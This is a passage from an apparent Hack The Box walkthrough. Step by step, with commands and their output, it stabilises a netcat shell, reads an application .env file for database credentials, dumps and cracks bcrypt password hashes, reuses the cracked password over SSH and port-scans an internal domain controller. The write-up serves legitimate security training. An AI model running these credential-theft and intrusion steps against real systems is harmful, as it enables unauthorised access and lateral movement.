|`stty rows 50 columns 200`|Sets the remote terminal dimensions|Stops long lines wrapping in the wrong place|

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

darkzero@SRV01:~$ export TERM=xterm
darkzero@SRV01:~$ stty rows 50 columns 200
darkzero@SRV01:~$ 
```

**What this gives you:** A fully interactive TTY session.

**Key findings:**

- Tab completion, command history, and Ctrl+C now function correctly within the remote shell rather than affecting the local listener.
- Commands requiring a controlling terminal — `su`, `ssh`, interactive password prompts, full-screen editors — will now work. This matters directly: later phases require `ssh` and `ksu`, both of which read from `/dev/tty` and fail on an unstabilised shell.
- `python3` is present on the target, which also indicates a scripting interpreter is available for later post-exploitation work.
<div align="center">
<br>
<br>
</div>

##### Why a netcat shell is not a terminal

A shell obtained through netcat is bash reading from and writing to a network socket. A socket is not a terminal, and a great deal of Unix behaviour quietly assumes a terminal exists.

A pseudo-terminal (PTY) is a kernel-provided device pair that emulates a physical terminal. It handles line editing, translates Ctrl+C into a SIGINT signal for the foreground process group, tracks window dimensions, and supports the `ioctl` calls that programs use to query terminal state. Without one, `bash` reports `Inappropriate ioctl for device` — it asked the kernel about a terminal that is not there.

The upgrade has two halves, and both are needed.

Remotely, `pty.spawn` creates a PTY and runs bash attached to it. Bash now has a proper terminal and job control works on the target side.

Locally, your own terminal is still in cooked mode: buffering input until Enter, echoing keystrokes, and capturing Ctrl+C for itself. With two terminals both processing input, keystrokes get handled twice and signals go to the wrong process. `stty raw -echo` disables all of it, reducing the local terminal to a transparent pipe so that only the remote PTY interprets anything.

If Python is unavailable, `script -qc /bin/bash /dev/null` allocates a PTY through the `script` utility instead. Where `socat` exists on both hosts it provides a fully-featured TTY in a single step, though it is rarely installed on targets by default.

**Next:** Enumerate the application directory for configuration files containing stored credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.4 — Enumerate the application directory

**Why this step:** A foothold exists as the web service account. Application service accounts commonly hold database credentials on disk. Enumerate `/opt` to locate the deployment and identify other software present on the host.

**Command:**

```bash
ls -la /opt/
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ls`|List directory contents|Shows what's in a folder|
|`-l`|Long format: permissions, owner, group, size, date|Shows who owns what and who can read it|
|`-a`|Include entries beginning with a dot|Reveals hidden files such as `.env`|
|`/opt/`|Conventional location for optional/third-party software|Where manually-deployed applications usually live|

**Result:**

```
total 24
drwxr-xr-x  6 root       root     4096 Jul 21 05:39 .
drwxr-xr-x 23 root       root     4096 Jul 20 13:13 ..
drwxrwxr-x  6 darkzero   darkzero 4096 Jul 14 06:10 DarkZero_Campaigns
drwxr-x---  4 svc-runner root     4096 May 20 23:36 gitea-runner
drwxr-xr-x  5 root       root     4096 Jul 21 05:38 sysinternalsEBPF
drwx------  2 root       root     4096 Jul 29 04:54 sysmon
```

**What this gives you:** The application root, plus evidence of two other systems on the host.

**Directory analysis:**

|Directory|Owner|Mode|Accessible as `darkzero`|Significance|Simple Explanation|
|---|---|---|---|---|---|
|`DarkZero_Campaigns`|darkzero|`drwxrwxr-x`|Read + write|The compromised web application|Our own app — full access|
|`gitea-runner`|svc-runner|`drwxr-x---`|**No**|Self-hosted Gitea Actions CI/CD runner|A build system that runs jobs as another user|
|`sysinternalsEBPF`|root|`drwxr-xr-x`|Read|Microsoft Sysinternals eBPF monitoring|Security monitoring, not a target|
|`sysmon`|root|`drwx------`|No|Microsoft Sysmon for Linux|Logs activity — assume actions are recorded|

**Key findings:**

- The application root is `/opt/DarkZero_Campaigns`, owned by `darkzero` and fully accessible from the current shell. Configuration files stored there are readable.
- **A Gitea Actions runner is installed at `/opt/gitea-runner`, owned by `svc-runner`.** The directory is unreadable from the current account, but its presence establishes that a self-hosted CI/CD runner executes jobs on this host as a distinct service account. CI/CD runners execute attacker-supplied workflow definitions with the runner account's privileges, making `svc-runner` a lateral-movement target.
- Gitea itself is not running from `/opt` — only the runner agent is present. The Gitea server is hosted elsewhere, presumably on the internal network the runner connects to.
- Microsoft Sysinternals tooling (`sysinternalsEBPF`, `sysmon`) is deployed on this Linux host. Sysmon for Linux records process creation, network connections, and file activity. This corroborates the Windows-centric environment inferred from the OS fingerprint in 1.3, and means post-exploitation activity is being logged.
- `svc-runner` and `root` are the only other local identities visible so far.

**Next:** Read the application's environment configuration for stored database credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.5 — Read the application environment configuration

The web application connects to a database and therefore holds credentials on disk. Node.js deployments conventionally store secrets in a `.env` file at the project root, readable by the account the service runs as — the account already compromised.

**Command:**

```bash
cat /opt/DarkZero_Campaigns/.env
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`cat`|Print a file's contents to stdout|Show me what's in this file|
|`/opt/DarkZero_Campaigns/.env`|Environment configuration at the application root|Where Node apps keep their secrets|

**Result:**

```shell
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```

**What this gives you:** Cleartext database credentials and the application's session signing key.

**Configuration analysis:**

|Key|Value|Significance|Simple Explanation|
|---|---|---|---|
|`PORT`|`8081`|Node listens on 8081; nginx proxies port 80 to it|The app's real port, hidden behind the web server|
|`DB_HOST`|`localhost`|Database is on this host, not remote|MySQL runs here, not somewhere else|
|`DB_USER`|`darkzero`|Database account name|Login name for the database|
|`DB_PASSWORD`|`C4ntFindMyDMpass!`|**Cleartext database password**|The database password, in plain text|
|`DB_NAME`|`darkzero_campaigns`|Target schema|Which database to open|
|`SESSION_SECRET`|`DarkSession312#`|HMAC key signing the `dz.sid` cookie|The key that proves a session cookie is genuine|

**Key findings:**

- **Database credentials recovered in cleartext:** `darkzero : C4ntFindMyDMpass!` against schema `darkzero_campaigns` on localhost. No exploitation was required — the file is necessarily readable by the service account.
- The session signing secret `DarkSession312#` is also exposed. Possession of this key permits forging arbitrary `dz.sid` session cookies, allowing authentication as any application user without knowing their password. Not needed here since database access supersedes it, but it is a complete authentication bypass in its own right.
- `PORT=8081` confirms the architecture inferred during reconnaissance: nginx on port 80 reverse-proxies to a Node.js process bound to 8081. Only nginx is externally exposed.
- Both the database password and session secret are weak, human-chosen strings rather than generated values. Reference material for this target records placeholder values (`change_me`) in these fields; this instance carries real credentials.

**Next:** Authenticate to the local MySQL instance with the recovered credentials and enumerate the users table for stored password hashes.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### #### 3.6 — Dump the application users table

Cleartext database credentials were recovered from the application's environment file. Authenticate to the local MySQL instance and dump the users table to obtain stored password hashes.

**Command:**

```bash
mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns -e "SELECT * FROM users;"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`mysql`|MySQL command-line client|The program that talks to the database|
|`-u darkzero`|Username from `DB_USER`|Who to log in as|
|`-p'C4ntFindMyDMpass!'`|Password from `DB_PASSWORD`, single-quoted|The password. Quotes are required — `!` triggers bash history expansion unquoted|
|`-h localhost`|Host from `DB_HOST`|Connect to the database on this machine|
|`-D darkzero_campaigns`|Schema from `DB_NAME`|Which database to open|
|`-e "SELECT * FROM users;"`|Execute a query and exit|Run one command instead of opening an interactive session|

**Result:**

```shell
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username             | password_hash                                                | role   | created_at          |
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin                | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh                 | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | nedmoeca@nimbaya.com  | nedmoeca@nimbaya.com | $2b$10$4sBqCdavaqgfbMYVXYdH3Ogf.MBui68v9KDBNtF6K6opZrWFgPqSm | player | 2026-07-29 09:53:28 |
+----+-----------------------+----------------------+--------------------------------------------------------------+--------+---------------------+
```

**What this gives you:** Password hashes for every application user.

**User analysis:**

|id|Username|Role|Created|Significance|Simple Explanation|
|---|---|---|---|---|---|
|1|`admin`|admin|2026-04-19|Application administrator, seeded with the box|Built-in admin account|
|3|`josh`|player|2026-05-19|A named individual, created separately from seed data|A real person's account — likely a real system user too|
|4|`nedmoeca@nimbaya.com`|player|2026-07-29|Account registered during this engagement|Ours; no value|

**Key findings:**

- Three password hashes recovered, all bcrypt in `$2b$10$` format. The `$2b$` prefix identifies bcrypt; `10` is the cost factor, meaning 2¹⁰ key-expansion rounds.
- **`josh` is the priority target.** The account is a named individual rather than a generic role, and was created a month after the seeded `admin`. Application usernames frequently correspond to operating-system or domain accounts, so cracking this hash may yield credentials reusable beyond the web application.
- Note the gap at `id = 2`. A row was deleted from this table at some point. The live database no longer holds it — but a backup taken before the deletion would.
- The `admin` hash is available but the role grants only application-level privileges already superseded by shell access. Deprioritised.
- `SELECT *` succeeded, confirming the `darkzero` database account has read access across the schema rather than restricted per-column grants.
<div align="center">
<br>
<br>
</div>

##### Reading a bcrypt hash, and why the format matters

A stored hash advertises its own algorithm. The string begins with a modular-crypt prefix identifying the scheme, and recognising it immediately narrows what tool and mode to use.

```
$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK
 └┬┘ └┬┘ └──────────────────────┬───────────────────────────┘
  │   │                          │
  │   │                          └─ 22-char salt + 31-char hash, Base64-encoded
  │   └─ cost factor: 2^10 = 1024 rounds
  └─ algorithm: bcrypt (2b = current revision)
```

Common prefixes worth memorising:

|Prefix|Algorithm|hashcat mode|
|---|---|---|
|`$2a$` / `$2b$` / `$2y$`|bcrypt|3200|
|`$1$`|MD5-crypt|500|
|`$5$`|SHA-256-crypt|7400|
|`$6$`|SHA-512-crypt|1800|
|`$argon2id$`|Argon2id|34000|
|32 hex chars, no prefix|Raw MD5|0|
|40 hex chars, no prefix|Raw SHA-1|100|

Bcrypt is deliberately slow. The cost factor is an exponent, so each increment doubles the work — cost 10 means 1024 rounds of key expansion per guess. On commodity hardware that translates to a few thousand guesses per second against bcrypt, versus billions per second against raw MD5.

The practical consequence is that bcrypt is only crackable when the password is weak. A wordlist attack against `rockyou.txt` will find `Rangers1` or `Summer2024`; it will not find a random 16-character string, and brute-forcing the keyspace is infeasible. So the decision to attempt a crack rests on a bet that the user chose something human — which, for a personal account on a hobby application, is a reasonable bet.

**Next:** Extract the target hash and attempt a dictionary attack.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.7 — Crack josh's password hash

The users table yielded bcrypt hashes for three accounts. `josh` is a named individual rather than a seeded role, making password reuse against system or domain accounts plausible. Attempt a dictionary attack against that hash alone.

**Commands:**

Write the hash to a file with its username, on the attacking host:

```bash
echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.hash
```

Run the attack:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`echo '...' > josh.hash`|Write the hash to disk in `username:hash` format|Save the target. Single quotes are required — unquoted, bash expands `$2b` and `$10` as variables|
|`john`|John the Ripper password cracker|The cracking tool|
|`--format=bcrypt`|Declare the hash algorithm|Skips auto-detection and removes ambiguity|
|`--wordlist=...rockyou.txt`|Dictionary attack against ~14M real passwords|Try known human passwords rather than every possible string|
|`josh.hash`|Input file|What to crack|

Only josh's hash is loaded. Bcrypt salts are per-hash, so every additional hash in the file multiplies the work — each candidate password must be re-hashed against each distinct salt.

**Result:**

```shell
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 0.00% (ETA: 2026-07-30 10:22) 0g/s 157.1p/s 157.1c/s 157.1C/s caitlin..yamaha
Rangers1         (josh)     
1g 0:00:02:52 DONE (2026-07-29 04:13) 0.005798g/s 156.7p/s 156.7c/s 156.7C/s babyboys..DAYANA
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**What this gives you:** A cleartext credential pair for a named user.

**Key findings:**

- **Credentials recovered: `josh : Rangers1`.** Cracked in 2 minutes 52 seconds at approximately 157 candidates per second.
- Throughput doubles when cracking a single hash. An earlier run loading both `admin` and `josh` reported `71.48p/s` against `142.9c/s` — two crypt operations per candidate, because each bcrypt hash carries its own salt and a candidate must be hashed separately against each. Restricting the attack to the one hash that matters halves the runtime.
- `admin` was deliberately excluded. Its `admin` role confers application-level privileges only, already superseded by shell access on the host.
- The password is a weak dictionary word with a trailing digit, exactly the pattern bcrypt fails to protect against. Bcrypt's cost factor defends against exhaustive search, not against a password that appears in a public wordlist.
<div align="center">
<br>
<br>
</div>

##### Why salt count dictates cracking time

An unsalted hash function computes one digest per input. Crack a thousand raw MD5 hashes and you hash each candidate password once, then compare the result against all thousand — the cost is independent of how many hashes you are attacking.

Salting removes that economy deliberately. Every bcrypt hash embeds a random 22-character salt, mixed into the key schedule before the password is processed. Two users with identical passwords produce entirely different hashes. To test one candidate against two hashes, the full 1024-round key expansion must run twice.

This is visible directly in John's status line:

```
71.48p/s    142.9c/s     ← two hashes: 2 crypts per candidate
156.7p/s    156.7c/s     ← one hash:  1 crypt per candidate
```

`p/s` counts candidate passwords tried; `c/s` counts crypt operations performed. When they match, one hash is loaded. When `c/s` is a multiple of `p/s`, that multiple is the number of distinct salts.

The operational rule follows: load only hashes you actually need. Every extra target is a proportional multiplier on wall-clock time, and against a deliberately slow algorithm that multiplier is expensive.

**Next:** Test the recovered credentials against SSH, since port 22 was identified as externally exposed during reconnaissance.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.8 — Authenticate over SSH with recovered credentials

Port 22 was exposed externally from the initial scan but unusable without credentials. The cracked application password may be reused for the system account of the same name.

**Command:**

```bash
ssh josh@TARGET_IP
```

Password: `Rangers1`

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ssh`|Secure Shell client|Log in to a remote machine|
|`josh@`|Username matching the cracked application account|Try the same name on the operating system|
|`TARGET_IP`|Host from the initial scan|The target machine|

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/DarkZeroReturns]
└─$ ssh josh@10.129.54.208                      
The authenticity of host '10.129.54.208 (10.129.54.208)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:42: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.54.208' (ED25519) to the list of known hosts.
josh@10.129.54.208's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 29 11:18:57 AM UTC 2026

  System load:  0.0                Processes:             153
  Usage of /:   47.6% of 10.66GB   Users logged in:       0
  Memory usage: 64%                IPv4 address for eth0: 172.16.20.3
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

5 updates can be applied immediately.
5 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

josh@SRV01:~$
```

Search for the user flag:

```bash
josh@SRV01:~$ find / -name user.txt 2>/dev/null
josh@SRV01:~$
```

No results.

**What this gives you:** A stable, fully interactive session as a named user, and the internal network topology.

**Key findings:**

- **Password reuse confirmed.** `Rangers1` authenticates `josh` at both the application layer and the operating system. A credential recovered from a web application database granted direct SSH access.
- **SRV01 is dual-homed. Its internal address is `172.16.20.3` on `eth0`.** The externally-reachable HTB address is a separate interface. An entire internal subnet `172.16.20.0/24` exists that was invisible to external scanning — this is the pivot point into the rest of the environment.
- The host is Ubuntu 24.04.4 LTS on kernel 6.8.0-136, current enough that kernel-level privilege escalation is not a promising path.
- `user.txt` is not present anywhere on this filesystem. The user flag resides on a different host, confirming the engagement extends beyond SRV01.
- The session is a genuine SSH login with a controlling TTY, so no shell stabilisation is required. Interactive commands work directly.
- Outbound HTTPS fails (`Failed to connect to https://changelogs.ubuntu.com`), indicating the host has no direct internet egress. Tooling must be transferred from the attacking machine rather than downloaded.

**Next:** Enumerate listening services on SRV01, particularly those bound to loopback or the internal interface, which were unreachable from outside.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.9 — Enumerate listening services on SRV01

External scanning revealed only two open ports. Services bound to loopback or filtered at the network edge are invisible from outside but reachable from a foothold on the host. Enumerate all listening sockets to map the internal attack surface.

**Command:**

```bash
ss -tlnp
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ss`|Socket statistics utility, successor to `netstat`|Lists network connections and listeners|
|`-t`|TCP sockets only|Ignore UDP|
|`-l`|Listening sockets only|Show what's waiting for connections, not established ones|
|`-n`|Numeric output|Don't resolve port numbers to service names or IPs to hostnames|
|`-p`|Show owning process|Name the program behind each socket, where permissions allow|

**Result:**

```
State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port   Process
LISTEN   0        4096           127.0.0.54:53             0.0.0.0:*
LISTEN   0        511             127.0.0.1:8081           0.0.0.0:*
LISTEN   0        4096        127.0.0.53%lo:53             0.0.0.0:*
LISTEN   0        151             127.0.0.1:3306           0.0.0.0:*
LISTEN   0        4096              0.0.0.0:22             0.0.0.0:*
LISTEN   0        511               0.0.0.0:80             0.0.0.0:*
LISTEN   0        70              127.0.0.1:33060          0.0.0.0:*
LISTEN   0        4096                    *:41557                *:*
LISTEN   0        4096                 [::]:22                [::]:*
```

**What this gives you:** A complete inventory of services on the host, including those unreachable from outside.

**Listening service analysis:**

|Address:Port|Binding|Service|External?|Analysis|Simple Explanation|
|---|---|---|---|---|---|
|`127.0.0.1:8081`|Loopback|Node.js application|No|Matches `PORT=8081` from `.env`; nginx proxies to it|The web app itself, reachable only via nginx|
|`127.0.0.1:3306`|Loopback|MySQL|No|Already accessed with credentials from `.env`|The database — already looted|
|`127.0.0.1:33060`|Loopback|MySQL X Protocol|No|Alternate MySQL interface, same instance|Second door to the same database|
|`127.0.0.54:53`, `127.0.0.53%lo:53`|Loopback|systemd-resolved|No|Local DNS stub resolver|Standard Ubuntu name resolution|
|`0.0.0.0:22`, `[::]:22`|All interfaces|OpenSSH|Yes|The SSH access already in use|Remote login|
|`0.0.0.0:80`|All interfaces|nginx|Yes|The web application front end|The website|
|`*:41557`|**All interfaces**|**Unidentified**|**No**|Owner process not visible to `josh`; filtered externally|An unknown service run by another user|

**Key findings:**

- **An unidentified service listens on `*:41557`, bound to all interfaces.** No process name is shown, indicating it runs under a different user account. The port falls within the range covered by the initial full-port scan (1.2), yet did not appear in those results — so it is filtered at the network edge while remaining reachable from within the internal network.
- The likely owner is the Gitea Actions runner identified at `/opt/gitea-runner` in 3.4. That directory is owned by `svc-runner` and unreadable from the current account, consistent with a socket whose process details are hidden. A runner agent maintains a listener for job dispatch from its Gitea server.
- Every loopback-bound service is already understood and offers no new access. MySQL is looted, the Node app is compromised, and the DNS stubs are standard Ubuntu components.
- No Gitea _server_ is listening on this host. Only the runner agent is present, so the Gitea instance itself is on another machine within `172.16.20.0/24`.
- The internal subnet is reachable from SRV01 via `172.16.20.3` but not from the attacking host. Access to any internal service requires tunnelling through this foothold.

##### Why loopback services are the first post-foothold target

A service bound to `127.0.0.1` accepts connections only from the machine itself. The kernel will not route external traffic to it. This is a deliberate and correct hardening measure: a database that only its own application needs to reach has no business being exposed to the network.

The consequence for an attacker is that external scanning systematically underreports the attack surface. Nmap against the public address of this host returned two ports. `ss -tlnp` from inside returns nine sockets. Seven services existed the entire time, invisible.

More importantly, loopback services are frequently configured on the assumption that only trusted local processes can reach them. Authentication may be weak, absent, or trivially bypassed, because the network boundary was treated as the security boundary. Once code execution is obtained on the host, that assumption fails completely — and the services behind it are often softer than anything facing the internet.

The distinct case here is `*:41557`. It is bound to all interfaces, not loopback, so it _is_ network-accessible — just not from outside, because a firewall filters it at the perimeter. That is a different security model with the same practical result: reachable now, unreachable before.

Running `ss -tlnp` immediately after establishing any foothold is therefore not optional. It routinely surfaces the path forward on machines where the external surface is a dead end, and it costs one command.

**Next:** Enumerate the internal network to identify hosts and services within `172.16.20.0/24`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.10 — Map the internal network

**Why this step:** SRV01's SSH banner revealed a second interface on `172.16.20.3`, an internal subnet invisible to external scanning. Identify live hosts and the network's role before attempting to reach services on it.

**Commands:**

```bash
for i in 1 2 3 4 5 10 20 100; do (ping -c1 -W1 172.16.20.$i >/dev/null 2>&1 && echo "172.16.20.$i UP") & done; wait
```

```bash
cat /etc/resolv.conf
```

```bash
ip route
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`for i in 1 2 3 ...`|Iterate over likely host addresses|Check the addresses infrastructure usually occupies|
|`ping -c1 -W1`|One echo request, one-second timeout|Ask once, don't wait long|
|`>/dev/null 2>&1 && echo`|Suppress output, print only on success|Only report hosts that answer|
|`( ... ) &` … `wait`|Run each probe as a background subshell, then wait|Probe all addresses simultaneously instead of serially|
|`cat /etc/resolv.conf`|Read DNS client configuration|Which server resolves names, and for which domain|
|`ip route`|Display the kernel routing table|Which networks this host can reach, and via what|

**Result:**

```shell
josh@SRV01:~$ for i in 1 2 3 4 5 10 20 100; do (ping -c1 -W1 172.16.20.$i >/dev/null 2>&1 && echo "172.16.20.$i UP") & done; wait
[1] 2620
[2] 2621
[3] 2622
[4] 2624
[5] 2625
[6] 2627
[7] 2632
[8] 2633
172.16.20.1 UP
[1]   Done                    ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
172.16.20.3 UP
172.16.20.2 UP
[2]   Done                    ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[3]   Done                    ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[4]   Exit 1                  ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[5]   Exit 1                  ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[6]   Exit 1                  ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[7]-  Exit 1                  ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[8]+  Exit 1                  ( ping -c1 -W1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )

josh@SRV01:~$ cat /etc/resolv.conf
nameserver 172.16.20.2
search darkzero.ext

josh@SRV01:~$ ip route
default via 172.16.20.1 dev eth0 onlink 
172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.3
```

**What this gives you:** The internal topology and the identity of the environment.

**Network map:**

|Host|Role|Evidence|Simple Explanation|
|---|---|---|---|
|`172.16.20.1`|Default gateway|`default via 172.16.20.1` in the routing table|The router out of this network|
|`172.16.20.2`|**Domain controller for `darkzero.ext`**|Listed as `nameserver`; DNS in an AD environment runs on a DC|The Windows server running the domain|
|`172.16.20.3`|SRV01 — this host|`src 172.16.20.3` on `eth0`|Where we are|

**Key findings:**

- **The environment is an Active Directory domain named `darkzero.ext`.** The `search darkzero.ext` directive in `/etc/resolv.conf` sets the DNS suffix appended to unqualified hostnames, which is configured automatically when a host joins a domain.
- **`172.16.20.2` is the domain controller.** It serves DNS for the domain, and in Windows environments AD-integrated DNS is hosted on domain controllers. This is the Windows infrastructure inferred from the OS fingerprint in 1.3 and never visible externally.
- **SRV01 is domain-joined.** A Linux host configured to resolve against AD DNS with the domain as its search suffix is integrated into the domain, not merely adjacent to it. This implies Kerberos configuration and possibly cached credentials on the host.
- Only three addresses in the scanned set respond. The probe covered `.1` through `.5` plus `.10`, `.20`, and `.100` — common infrastructure positions — rather than the full /24, so the map is indicative rather than exhaustive.
- SRV01 sits directly on `172.16.20.0/24` with no intermediate routing. Every host on the subnet is reachable from this foothold at layer 3.
- The Gitea server implied by the runner in `/opt/gitea-runner` is not on SRV01 (3.9). It must reside on another host in this subnet.

**Next:** Enumerate services on the domain controller to confirm its role and locate the Gitea instance.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.11 — Enumerate services on the domain controller

`172.16.20.2` was identified as the DNS server for `darkzero.ext` and presumed to be a domain controller. Confirm that role by service profile, and locate the Gitea server implied by the runner agent found on SRV01.

**Command:**

```bash
for p in 22 53 80 88 135 139 389 443 445 464 636 3000 3268 3389 5985 9389; do (timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2>/dev/null && echo "$p OPEN") & done 2>/dev/null; wait
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`for p in ...`|Iterate over a targeted port list|Check specific ports rather than all 65535|
|`timeout 1`|Abort each probe after one second|Don't hang on filtered ports|
|`bash -c "echo > /dev/tcp/HOST/PORT"`|Bash pseudo-device that opens a TCP connection|Built-in port testing — no scanner needed on the target|
|`2>/dev/null`|Discard connection-refused errors|Keep output clean|
|`&& echo "$p OPEN"`|Report only on successful connection|Only list ports that answered|
|`( ... ) &` … `wait`|Background each probe, then wait for all|Test every port simultaneously|

Bash's `/dev/tcp` is used because no port scanner is installed on the target and the host has no internet egress to fetch one. The port list is chosen to fingerprint a domain controller and to test Gitea's default port.

**Result:**

```
53 OPEN
88 OPEN
135 OPEN
139 OPEN
389 OPEN
445 OPEN
464 OPEN
636 OPEN
3000 OPEN
3268 OPEN
5985 OPEN
9389 OPEN
```

Ports 22, 80, 443, and 3389 returned exit code 124 (timeout) and are closed or filtered.

**Service analysis:**

|Port|Service|Role|Simple Explanation|
|---|---|---|---|
|53|DNS|AD-integrated DNS for `darkzero.ext`|Resolves names for the domain|
|88|Kerberos|Ticket-granting service|Issues authentication tickets|
|135|RPC endpoint mapper|Locates RPC services|Directory for Windows remote procedure calls|
|139|NetBIOS session|Legacy SMB transport|Old-style file sharing|
|389|LDAP|Directory queries, cleartext|Read the directory of users and groups|
|445|SMB|File sharing and named pipes|Modern file sharing; also carries admin protocols|
|464|kpasswd|Kerberos password change|Change domain passwords|
|636|LDAPS|Directory queries over TLS|Encrypted directory access|
|**3000**|**Gitea**|**Self-hosted Git server**|**Source control, running on the DC**|
|3268|Global catalog|Forest-wide directory queries|Search across the whole forest, not just this domain|
|5985|WinRM|Remote PowerShell|Remote command execution|
|9389|AD Web Services|ADWS for PowerShell AD cmdlets|Programmatic directory management|

**Key findings:**

- **`172.16.20.2` is confirmed as a domain controller for `darkzero.ext`.** The combination of Kerberos (88, 464), LDAP (389, 636), global catalog (3268), SMB (445), RPC (135), and ADWS (9389) is definitive.
- **Gitea is listening on port 3000 of the domain controller itself.** The runner agent at `/opt/gitea-runner` on SRV01 connects to this instance. Co-locating a web application with a DC means any code execution against Gitea occurs on the machine holding the domain's directory database.
- Port 3268 indicates a global catalog server. Global catalogs hold a partial replica of every domain in the _forest_, so this environment contains more than one domain. Worth noting for later — the forest structure is likely to matter.
- WinRM on 5985 offers remote command execution given valid domain credentials, providing an execution path that does not require SMB.
- None of these services appeared in the external scan. The entire Active Directory environment was invisible until the foothold on SRV01.
<div align="center">
<br>
<br>
</div>

##### Fingerprinting a domain controller by its ports

Active Directory domain controllers advertise themselves through a distinctive and stable set of services. Recognising the pattern is faster than any dedicated tool.

The Kerberos pair, **88** and **464**, is the strongest single indicator. Port 88 runs the Key Distribution Center that issues authentication tickets; 464 handles password changes. Only a DC runs these.

**LDAP** on 389 and 636 exposes the directory itself — every user, group, computer, and policy object. Anonymous binds are usually restricted, but with valid credentials LDAP is the primary enumeration surface for a domain.

**3268** is the global catalog, and it carries extra meaning. A global catalog holds a partial replica of every object in the _entire forest_, not just the local domain. Its presence signals that the forest may contain multiple domains and that cross-domain queries are possible from this single host.

**445** carries SMB, which does far more than file sharing: named pipes over SMB transport the protocols behind remote service control, scheduled tasks, and the DRSUAPI replication interface that DCSync abuses.

**9389** is Active Directory Web Services, the SOAP endpoint behind PowerShell's `Get-ADUser` and related cmdlets.

Seeing all of these together identifies a DC with certainty. Seeing an _additional_ service alongside them — here, Gitea on 3000 — is a finding in its own right. Domain controllers are supposed to run domain controller software and nothing else, precisely because any application vulnerability on a DC is a domain compromise rather than an application compromise.

**Next:** Confirm the service on port 3000 is Gitea and determine its authentication configuration.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

